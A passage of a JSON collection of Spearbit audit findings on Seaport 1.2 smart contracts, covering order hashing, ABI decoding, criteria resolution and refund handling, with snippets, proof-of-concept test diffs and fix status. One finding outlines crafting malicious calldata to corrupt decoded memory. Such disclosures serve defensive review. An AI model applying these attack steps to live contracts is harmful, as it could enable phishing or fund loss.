      "content": "## Security Audit Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `OrderValidator.sol#L382`\n- `CounterManager.sol#L54`\n\n## Description\nWhen `_contractNonces[offerer]` gets updated, no event is emitted. This is in contrast to when a counter is updated. \n\nOne might be able to extract the `_contractNonces[offerer]` (if it doesn't overflow 12 bytes to enter into the offerer region in the order hash) from a later event when `OrderFulfilled` gets emitted. `OrderFulfilled` only gets emitted for an order of CONTRACT type if the `generateOrder(...)`'s return data satisfies all the constraints.\n\n## Recommendation\nEmit a custom event when `_contractNonces[offerer]` gets updated if it's important for off-chain agents to monitor this value.\n\n## Acknowledgements\n- **Seaport**: Acknowledged.\n- **Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15965",
      "title": "OrderHash in the context of contract orders need not refer to a unique order",
      "impact": "LOW",
      "content": "## Order Validation Risk Assessment\n\n## Severity: Low Risk\n\n### Context\nOrderValidator.sol#L386\n\n### Description\nIn Seaport 1.1 and in Seaport 1.2 for non-contract orders, order hashes have a unique correspondence with the order, i.e., it can be used to identify the status of an order on-chain and track it. However, in the case of contract orders, this is not the case. It is simply the current nonce of the offerer, combined with the address. This cannot be used to uniquely track an order on-chain.\n\n```solidity\nuint256 contractNonce;\nunchecked {\n    contractNonce = _contractNonces[offerer]++;\n}\nassembly {\n    orderHash := or(contractNonce, shl(0x60, offerer))\n}\n```\n\n### Problematic Scenarios\n\n#### Scenario 1: Reverted Contract Order\nA reverted contract order and the adjacent succeeding contract order will have the same order hash, regardless of whether they correspond to the same order.\n1. Consider Alice calling `fulfilledAdvancedOrder` for a contract order with `offerer = X`, where X is a smart contract that offers contract orders on Seaport 1.2. Assume that this transaction failed because enough gas was not provided for the `generateOrder` call. This transaction would revert with a custom error `InvalidContractOrder`, generated from `OrderValidator.sol#L391`.\n2. Consider Bob calling `fulfilledAdvancedOrder` for a different contract order with `offerer = X`, the same smart contract offerer. This order will succeed and emit the `OrderFulfilled` event from `OrderFulfiller.sol#L124`.\n\nIn the above scenario, there are two different orders: one that reverted on-chain and the other that succeeded, both having the same `orderHash` despite the orders only sharing the same contract offerer -- the other parameters can be completely arbitrary.\n\n#### Scenario 2: Misleading Off-Chain Computed Hashes\nContract order hashes computed off-chain can be misleading.\n1. Consider Alice calling `fulfilledAdvancedOrder` for a contract order with `offerer = X`, where X is a smart contract that offers contract orders on Seaport 1.2. Alice computed the `orderHash` of their order off-chain by simulating the transaction, sends the transaction, and polls the `OrderFulfilled` event with the same `orderHash` to know if the order has been fulfilled.\n2. Consider Bob calling `fulfilledAdvancedOrder` for any contract order with `offerer = X`, the same smart contract offerer.\n3. Bob's transaction gets included first. An `OrderFulfilled` event is emitted, with the `orderHash` being the same hash that Alice computed off-chain! Alice may believe that their order succeeded.\n\n**Note:** For non-contract orders, the above approach would be valid, i.e., one may generate and sign an order, compute the order hash of an order off-chain, and poll for an `OrderFulfilled` with the order hash to know that it was fulfilled. \n\n**Note:** Even though there is an easier way to track if the order succeeded in these cases, in the general case, Alice or Bob need not be the one executing the orders on-chain. An off-chain agent may send misleading notifications to either party that their order succeeded due to this quirk with contract order hashes.\n\n### Recommendation\n1. Consider computing the order hash for contract orders similarly to how regular orders are hashed.\n2. If the same mechanism is maintained, document that using `orderHashes` as a unique identifier is not reliable.\n\n### Acknowledgments\n- Seaport: Acknowledged.\n- Spearbit: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15964",
      "title": "abi_decode_bytes does not mask the copied data length",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ConsiderationDecoder.sol#L60\n\n## Description\nWhen `abi_decode_bytes` decodes bytes, it does not mask the copied length of the data in memory (other places where the length is masked by `OffsetOrLengthMask`).\n\n## Recommendation\nMake sure to also mask the copied length before saving it to the memory.\n\n## Seaport\nFixed in PR 823.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15963",
      "title": "When contractNonce occupies more than 12bytes the truncated nonce shared back with the contract offerer through ratifyOrder would be smaller than the actual stored nonce",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ConsiderationEncoder.sol#L146\n- OrderValidator.sol#L385-L387\n\n## Description\nWhen `contractNonce` occupies more than 12 bytes, the truncated nonce shared back with the contract offerer through `ratifyOrder` would be smaller than the actual stored nonce:\n\n```solidity\n// Write contractNonce to calldata\ndstHead.offset(ratifyOrder_contractNonce_offset).write(\n    uint96(uint256(orderHash))\n);\n```\n\nThis is due to the way `contractNonce` and the offerer's address are mixed in the `orderHash`:\n\n```assembly\norderHash := or(contractNonce, shl(0x60, offerer))\n```\n\n## Recommendation\nOne can avoid the truncation by using XOR when calculating the `orderHash`:\n\n```assembly\norderHash := xor(contractNonce, offerer)\n```\n\nAnd sending the full `orderHash` to the contract offerer's `ratifyOrder` endpoint:\n\n```solidity\ndstHead.offset(ratifyOrder_contractNonce_offset).write(orderHash);\n```\n\nThe contract offerer can deduce the nonce by XORing its address with the received hash again:\n\n```solidity\nnonce := xor(orderHash, address())\n```\n\nThis would also make the calculations cheaper.\n\n## Seaport\nFixed in commit `f82012`.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15962",
      "title": "_isValidBulkOrderSize does not perform the signature length validation correctly.",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- Verifiers.sol#L122-L125\n\n## Description\nIn `isValidBulkOrderSize`, the signature's length validation is performed as follows:\n\n```solidity\nlet length := mload(signature)\nvalidLength := and(\n    lt(length, BulkOrderProof_excessSize),\n    lt(and(sub(length, BulkOrderProof_minSize), AlmostOneWord), 2)\n)\n```\n\nThe `sub` opcode in the above snippet wraps around. If this was the correct formula, then it would actually simplify to:\n\n```solidity\nlt(and(sub(length, 3), AlmostOneWord), 2)\n```\n\nThe simplified and the current version would allow length to also be `3`, `4`, `35`, `36`, `67`, `68`, but `_isValidBulkOrderSize` actually needs to check that length (`l`) has the following form:\n\n```\nl = (64 + x) + 3 + 32y\n```\n\nwhere `x ∈ {0, 1}` and `y ∈ {1, 2, ..., 24}` (y represents the height/depth of the bulk order).\n\n## Recommendation\nModify the assembly block to reflect the constraints needed for the above formula:\n\n```solidity\nlet z := sub(mload(signature), BulkOrderProof_minSize)\nvalidLength := and(\n    lt(z, 738), // 738 = (1 + 32 * 23) + 1, named constant BulkOrderProof_rangeSize\n    lt(and(z, AlmostOneWord), 2)\n)\n```\n\n- Verification:\n  ```solidity\n  lt(sub(length, 99), 738)\n  ```\n  ```\n  l − 99 = l − (64 + 3 + 32) = x + 32(y − 1)  ≤ 1 + 32 * 23 = 737 < 738\n  ```\n  \nThis also takes care of underflows and we end up with a condition that `l ∈ {99, 100, ..., 836}`.\n\n```solidity\nlt(and(add(length, 29), 31), 2)\n```\n\n```\n(l + 0b11101) & 0b11111 ∈ {0, 1}\n```\n\ntranslates into `l + 29 ≡ 0, 1 (mod 32)` or `l ≡ 3, 4 (mod 32)` or `l − 99 ≡ 0, 1 (mod 32)` which enforces `l − 99` to be of a form `x + 32y0` where `x ∈ {0, 1}` and `y0 ∈ ℤ`.\n\nFrom the first part, we know that `l − 99 ∈ {0, 1, ..., 737}` and so that would restrict `y0` to be in `{0, 1, ..., 23}`. \n\nAnd so,\n\n```\nl = (64 + x) + 3 + 32(y0 + 1)  ∈ {67 + x, 68 + x, ..., 836}\n```\n\n## Spearbit\nThe solution mentioned above might be cheaper than PR 797 (depends on the stack juggling by the compiler).\n\n## Seaport\nLeaving it as-is for 1.2 as it's close either way.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15961",
      "title": "Calls to TypehashDirectory will be successful",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- TypehashDirectory.sol#L119\n\n## Description\nTypehashDirectory's deployed bytecode starts with `00`, which corresponds to the STOP opcode (SSTORE2 also uses this pattern). This choice for the 1st bytecode causes accidental calls to the contract to succeed silently.\n\n## Recommendation\nDocument the reason why STOP was used for the 1st opcode. If it's not necessary to have STOP as the first opcode, use an opcode that reverts calls to TypehashDirectory, as it is only used as a data storage contract.\n\n## Seaport\nFixed in PR 799.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15960",
      "title": "CriteriaResolvers.criteriaProof is not validated in the identifierOrCriteria == 0 case",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File**: `CriteriaResolution.sol`\n- **Lines**: 199-206\n\n## Description\nIn the case of `identifierOrCriteria == 0`, the criteria resolver completely skips any validations on the Merkle proof and, in particular, is missing the validation that `CriteriaResolvers.criteriaProof.length == 0`.\n\n**Note**: This issue is also present in Seaport 1.1 and may be a known issue.\n\n## Proof of Concept\nModified `test/advanced.spec.ts`:\n\n```diff\n@@ -3568,9 +3568,8 @@ describe( `Advanced orders (Seaport v${VERSION}) `, function () {\n // Seller approves marketplace contract to transfer NFTs\n await set1155ApprovalForAll(seller, marketplaceContract.address, true);\n- const { root, proofs } = merkleTree([nftId]);\n- const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))];\n+ const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))];\n const consideration = [\n getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address),\n @@ -3578,8 +3577,9 @@ describe( `Advanced orders (Seaport v${VERSION}) `, function () {\n getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address),\n ];\n+ // Add a junk criteria proof and the test still passes\n const criteriaResolvers = [\n- buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]),\n+ buildResolver(0, 0, 0, nftId, [\"0xdead000000000000000000000000000000000000000000000000000000000000\"]),\n ];\n const { order, orderHash, value } = await createOrder(\n```\n\n## Recommendation\nConsider adding the following additional check in the modified `contracts/lib/CriteriaResolution.sol`:\n\n```diff\n@@ -203,6 +203,8 @@ contract CriteriaResolution is CriteriaResolutionErrors {\n identifierOrCriteria,\n criteriaResolver.criteriaProof\n );\n+ } else {\n+ require(criteriaResolver.criteriaProof.length == 0);\n }\n```\n\n## Seaport\nFixed in PR 825.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15959",
      "title": "Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ConsiderationDecoder.sol#L569-L574\n- FulfillmentApplier.sol#L722-L736\n\n## Description\nWhen Seaport receives a collection of advanced orders to match or fulfill, if one of the orders has a CONTRACT order type, Seaport calls the `generateOrder(...)` endpoint of that order's offerer. `generateOrder(...)` can provide new consideration item recipients for this order. These new recipients are going to be used for this order from this point on. \n\nIn `_getGeneratedOrder`, there is no comparison between old or new consideration recipients. The provided new recipients can create an issue when aggregating consideration items. Since the fulfillment data is provided beforehand by the caller of the Seaport endpoint, the caller might have provided fulfillment aggregation data that would have aggregated/combined one of the consideration items of this changed advance order with another consideration item. However, the aggregation had taken into consideration the original recipient of the order in question. \n\nMultiple consideration items can only be aggregated if they share the same `itemType`, `token`, `identifier`, and `recipient` (ref). The new recipients provided by the contract offerer can break this invariant and, in turn, cause a revert.\n\n## Recommendation\nEither:\n- The original consideration item recipients would need to be shared with the contract offerer when `generateOrder(...)` is called, and they would stay the same for the new consideration items. This way, the offerer can check these recipients and revert the call if needed. In this case, the caller of Seaport endpoints would need to somehow (perhaps using the `previewOrder` endpoint) get the recipients beforehand.\n- Ensure that the old and new consideration recipients are the same.\n\nAdditionally, if changes are not applied, consider documenting this scenario for the users you call into Seaport or create custom offerer contracts. Adding more comments/documentation for `previewOrder` endpoint and `generateOrder` is also recommended.\n\n## Seaport\nFixed in PR 824 which ensures that either the new recipient can be any address if the original was `address(0)` or the new and old consideration recipients have to match (otherwise the call would revert).\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15958",
      "title": "ABI decoding for bytes: memory can be corrupted by maliciously constructing the calldata",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity: \n**Medium Risk**\n\n## Context: \n`ConsiderationDecoder.sol#L51-L62`\n\n## Description: \nIn the code snippet below, `size` can be made `0` by maliciously crafting the calldata. In this case, the free memory is not incremented.\n\n```solidity\nassembly {\n    mPtrLength := mload(0x40)\n    let size := and(\n        add(\n            and(calldataload(cdPtrLength), OffsetOrLengthMask),\n            AlmostTwoWords\n        ),\n        OnlyFullWordMask\n    )\n    calldatacopy(mPtrLength, cdPtrLength, size)\n    mstore(0x40, add(mPtrLength, size))\n}\n```\n\nThis has two different consequences:\n1. If the memory offset `mPtrLength` is immediately used, then junk values at that memory location can be interpreted as the decoded bytes type. In the case of Seaport 1.2, the likelihood of the current free memory pointing to junk value is low. So, this case has low severity.\n2. The consequent memory allocation will also use the value `mPtrLength` to store data in memory. This can lead to corrupting the initial memory data. In the worst case, the next allocation can be tuned so that the first bytes data can be any arbitrary data.\n\n### Steps to Make the Size Calculation Return 0:\n1. Find a function call which has `bytes` as a (nested) parameter.\n2. Modify the calldata field where the length of the above byte is stored to the new length `0xffffe0`.\n3. The calculation will now return `size = 0`.\n\n**Note:** There is an additional requirement that this `bytes` type should be inside a dynamic struct. Otherwise, for example, in the case of `function foo(bytes calldata signature)`, the compiler will insert a check that calldata-size is big enough to fit `signature.length`. Since the value `0xffffe0` is too big to fit into calldata, such an attack is impractical.\n\nHowever, for `bytes` type inside a dynamic type, for example in `function foo(bytes[] calldata signature)`, this check is skipped by `solc` (likely because it's expensive). For a practical exploit, we need to look for such a function. In the case of Seaport 1.2, this could be the `matchAdvancedOrders(AdvancedOrder[] calldata orders, ...)` function. The struct `AdvancedOrder` has a nested parameter `bytes signature` as well as `bytes extraData`.\n\nIn the above exploit, one would be able to maliciously modify the calldata in such a way that Seaport would interpret the data in `extraData` as the `signature`. Here is a proof of concept for a simplified case that showcases injecting an arbitrary value into a decoded bytes.\n\nAs for severity, even though interpreting calldata differently may not fundamentally break the protocol, an attacker with enough effort may be able to use this for subtle phishing attacks or as a precursor to other attacks.\n\n## Recommendation: \nUpdating `OnlyFullWordMask` to `0xff_ff_ff_e0` will not fix this as you can still replace `len` by `0xff_ff_ff_e0` and get the same effect. Also see **The size calculation can be incorrect for large numbers**.\n\n## Seaport: \nFixed in PR 789.\n\n## Spearbit: \nVerified.",
      "summary": "\nThis bug report pertains to the code snippet in ConsiderationDecoder.sol#L51-L62, which could be exploited to make the size calculation return 0. This could be done by maliciously crafting the calldata to modify the length of a bytes parameter inside a dynamic struct. This could lead to corrupting the initial memory data, and in the worst case, the next allocation can be tuned to contain arbitrary data. Even though this exploit may not fundamentally break the protocol, it could be used for subtle phishing attacks or as a precursor to other attacks. The bug was fixed in Seaport PR 789, and Spearbit verified the fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "ABI Encoding"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15957",
      "title": "Calls to PausableZone 'sexecuteMatchAdvancedOrders and executeMatchOrders would revert if unused native tokens would need to be returned",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- PausableZone.sol#L34\n- PausableZone.sol#L149\n- PausableZone.sol#L188\n- OrderCombiner.sol#L704-L707\n\n## Description\nIn match (advanced) orders, one can provide native tokens as offer and consideration items. So, a PausableZone would need to provide msg.value to call the corresponding Seaport endpoints. There are a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used:\n\n1. Rounding errors in calculating the current amount of offer or consideration items. The zone can prevent sending extra native tokens to Seaport by pre-calculating these values and making sure to have its transaction to be included in the specific block that these values were calculated for (this is important when the start and end amount of an item are not equal).\n2. The zone (un)intentionally sends more native tokens than are necessary to Seaport.\n3. The (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the offerer contract provides a different amount for at least one item that would eventually make the whole transaction not use the full amount of msg.value provided to it.\n\nIn all these cases, since PausableZone does not have a receive or fallback endpoint to accept native tokens, when Seaport tries to send back the unused native token amount, the transaction may revert.\n\n### PausableZone not accepting native tokens:\n```bash\n$ export CODE=$(jq -r '.deployedBytecode' artifacts/contracts/zones/PausableZone.sol/PausableZone.json | tr -d '\\n')\n$ evm --code $CODE --value 1 --prestate genesis.json --sender 0xb4d0000000000000000000000000000000000000 --nomemory=false --debug run\n$ evm --input $(echo $CODE | head -c 44 - | sed -E s/0x//) disasm\n```\n\n```\n6080806040526004908136101561001557600080fd\n...\n```\n\n#### TRACE\n```plaintext\nPUSH1 pc=00000000 gas=4700000 cost=3\nDUP1 pc=00000002 gas=4699997 cost=3\n...\n```\n\n#### LOGS\n```json\ngenesis.json : {\n  \"gasLimit\": \"4700000\",\n  \"difficulty\": \"1\",\n  \"alloc\": {\n    \"0xb4d0000000000000000000000000000000000000\": {\n      \"balance\": \"10000000000000000000000000\",\n      \"code\": \"\",\n      \"storage\": {}\n    }\n  }\n}\n```\n\n```typescript\n// file: test/zone.spec.ts\n...\nit(\"Fulfills an order with executeMatchAdvancedOrders with NATIVE Consideration Item\", async () => {\n  const pausableZoneControllerFactory = await ethers.getContractFactory(\n    \"PausableZoneController\",\n    owner\n  );\n  const pausableZoneController = await pausableZoneControllerFactory.deploy(\n    owner.address\n  );\n  // Deploy pausable zone\n  const zoneAddr = await createZone(pausableZoneController);\n  ...\n});\n...\n```\n\nThis bug also applies to Seaport 1.1 and PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00)\n\n## Recommendation\nIt is really important for zones that are trying to match orders that involve native tokens to be able to receive those tokens back from Seaport if all of them are not used. In the case of Solidity contracts, one should define receive or fallback endpoints for these contracts (or the __default__ function if using Vyper).\n\n**Seaport:** Acknowledged.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nA bug has been reported in the PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00 ) and Seaport 1.1 which affects the matching of orders that include native tokens. In these cases, the PausableZone does not have a receive orfallback endpoint to accept native tokens, so when Seaport tries to send back the unsued native token amount the transaction may revert. \n\nThis bug can be caused by a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used. These scenarios include rounding errors, the zone (un)intentionally sending more native tokens than necessary, and the (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the offerer contract provides different amount for at least one item.\n\nIn order to prevent this bug, it is important for zones that are trying to match orders that would involve native tokens to be able to receive those tokens back from Seaport if all of them are not used. In case of Solidity contracts, one should define receive orfallback endpoints for these contracts (or the __default__ function if using Vyper).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Refund Ether",
        "DOS"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15956",
      "title": "AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT order type",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n### Severity: Medium Risk\n\n### Context\n- `OrderValidator.sol#L150-L153`\n- `OrderCombiner.sol#L455-L463`\n\n### Description\nFor most advanced order types, we have the following check:\n\n```solidity\n// Read numerator and denominator from memory and place on the stack.\nuint256 numerator = uint256(advancedOrder.numerator);\nuint256 denominator = uint256(advancedOrder.denominator);\n// Ensure that the supplied numerator and denominator are valid.\nif (numerator > denominator || numerator == 0) {\n    _revertBadFraction();\n}\n```\n\nFor `CONTRACT` order types, this check is skipped. For later calculations (calculating the current amount), Seaport uses the numerator and denominator returned by `_getGeneratedOrder`, which as a pair is either `(1, 1)` or `(0, 0)`. \n\n`advancedOrder.numerator` is only used to skip certain operations in some loops when it is `0`:\n- Skip applying criteria resolvers.\n- Skip aggregating the amount for executions.\n- Skip the final validity check.\n\nSkipping the above operations would make sense. However, when for an `advancedOrder` with `CONTRACT` order type `_getGeneratedOrder` returns `(h, 1, 1)` and `advancedOrder.numerator == 0`, we would:\n- Skip applying criteria resolvers\n- Aggregate the amounts from offer or consideration amounts for this order\n- Skip the final validity check that would call into the `ratifyOrder` endpoint of the offerer. \n\nBut emitting the following `OrderFulfilled` will not be skipped, even though this `advancedOrder` will not be used:\n\n```solidity\n// Emit an OrderFulfilled event.\n_emitOrderFulfilledEvent(\n    orderHash,\n    orderParameters.offerer,\n    orderParameters.zone,\n    recipient,\n    orderParameters.offer,\n    orderParameters.consideration\n);\n```\n\nThis can create discrepancies between what happens on-chain and what off-chain agents index/record.\n\n### Recommendation\nEven though `AdvancedOrder.numerator` and `AdvancedOrder.denominator` are not really used for advanced orders of `CONTRACT` type, and `AdvancedOrder.numerator` is only used for signaling certain decisions in the call, it would be best to either hoist the checks regarding these parameters to an earlier point:\n\n```solidity\n// Read numerator and denominator from memory and place on the stack.\nuint256 numerator = uint256(advancedOrder.numerator);\nuint256 denominator = uint256(advancedOrder.denominator);\n// Ensure that the supplied numerator and denominator are valid.\nif (numerator > denominator || numerator == 0) {\n    _revertBadFraction();\n}\n// If the order is a contract order, return the generated order.\nif (orderParameters.orderType == OrderType.CONTRACT) {\n    // Return the generated order based on the order params and the\n    // provided extra data. If revertOnInvalid is true, the function\n    // will revert if the input is invalid.\n    return _getGeneratedOrder(\n        orderParameters,\n        advancedOrder.extraData,\n        revertOnInvalid\n    );\n}\n```\n\nOr for `orderParameters.orderType == OrderType.CONTRACT`, enforce that `advancedOrder.numerator == advancedOrder.denominator == 1`.\n\n### Additional Notes\n- **Seaport**: Fixed in PR 815.\n- **Spearbit**: Verified.",
      "summary": "\nThis bug report is about a check that is skipped when an advanced order of type CONTRACT is used. The check is supposed to ensure that the numerator and denominator provided are valid. This can create discrepancies between what happens on chain and what off-chain agents index/record. The recommendation is to either hoist the checks regarding these parameters to an earlier point in the code or enforce that the numerator and denominator are both equal to 1. The bug has been fixed in a pull request and verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15955",
      "title": "Advance orders of CONTRACT order types can generate orders with less consideration items that would break the aggregation routine",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- **OrderValidator.sol**: Lines 444-447\n- **FulfillmentApplier.sol**: Lines 561-569\n\n## Description\nWhen Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a `CONTRACT` order type, Seaport calls the `generateOrder(...)` endpoint of that order's offerer. `generateOrder(...)` can provide fewer consideration items for this order. So, the total number of consideration items might be less than the ones provided by the caller.\n\nSince the caller would need to provide the fulfillment data beforehand to Seaport, they might use indices that would turn out to be out of range for the consideration in question after the modification applied for the contract offerer above. If this happens, the whole call will be reverted.\n\nThis issue is in the same category as advance orders of `CONTRACT` order types that can generate orders with different consideration recipients, which would break the aggregation routine.\n\n## Recommendation\nIn order for the caller to be able to fulfill/match orders by figuring out how to aggregate and match different consideration and offer items, they would need to have access to all the data before calling into Seaport. Contract offerers are supposed to (though it is not enforced currently) implement `previewOrder`, which the caller can use before making a call to Seaport. However, there is no guarantee that the data returned by `previewOrder` and `generateOrder` for the same shared inputs would be the same.\n\nWe can enforce that the contract offerer does not return fewer consideration items. If it needs to return less, it can either revert or provide a 0 amount.\n\nIf the current conditions are going to stay the same, it is recommended to document this scenario and also provide more comments/documentation for `ContractOffererInterface`.\n\n## Seaport\nAddressed in PR 842.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about an issue with the Seaport service when it receives an advanced order with a CONTRACT order type. The caller provides the fulfillment data to Seaport, but when the contract offerer generates the order, it might provide fewer consideration items than the caller provided. This would cause the call to be reverted and the aggregation routine to break.\n\nTo address this issue, it is recommended to enforce that the contract offerer does not return fewer consideration items. If it needs to return less, it can either revert or provide a 0 amount. Additionally, more comments/documentation should be provided for ContractOffererInterface. Seaport has addressed the issue in PR 842 and it has been verified by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "SEAPORT",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Sawmon and Natalie",
        "Dravee",
        "Harikrishnan Mulackal",
        "Ellahi"
      ]
    },
    {
      "id": "15954",
      "title": "Empty criteriaResolvers for criteria-based contract orders",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- OrderValidator.sol#L312-L315\n- CriteriaResolution.sol#L119\n\n## Description\nThere is a deviation in how criteria-based items are resolved for contract orders. For contract orders which have offers with criteria, the `_compareItems` function checks that the contract offerer returned a corresponding non-criteria based `itemType` when `identifierOrCriteria` for the original item is 0, i.e., offering from an entire collection. Afterwards, the `orderParameters.offer` array is replaced by the offer array returned by the contract offerer.\n\nFor other criteria-based orders such as offers with `identifierOrCriteria = 0`, the `itemType` of the order is only updated during the criteria resolution step. This means that for such offers there should be a corresponding `CriteriaResolver` struct. See the following test:\n\n```diff\nmodified test/advanced.spec.ts\n@@ -3568,9 +3568,8 @@ describe( `Advanced orders (Seaport v${VERSION}) `, function () {\n // Seller approves marketplace contract to transfer NFTs\n await set1155ApprovalForAll(seller, marketplaceContract.address, true);\n- const { root, proofs } = merkleTree([nftId]);\n- const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))];\n+ const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))];\n const consideration = [\n getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address),\n@@ -3578,8 +3577,9 @@ describe( `Advanced orders (Seaport v${VERSION}) `, function () {\n getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address),\n ];\n+ // Replacing by `const criteriaResolvers = [] `will revert\n const criteriaResolvers = [\n- buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]),\n+ buildResolver(0, 0, 0, nftId, []),\n ];\n const { order, orderHash, value } = await createOrder(\n```\n\nHowever, in case of contract offers with `identifierOrCriteria = 0`, Seaport 1.2 does not expect a corresponding `CriteriaResolver` struct and will revert if one is provided as 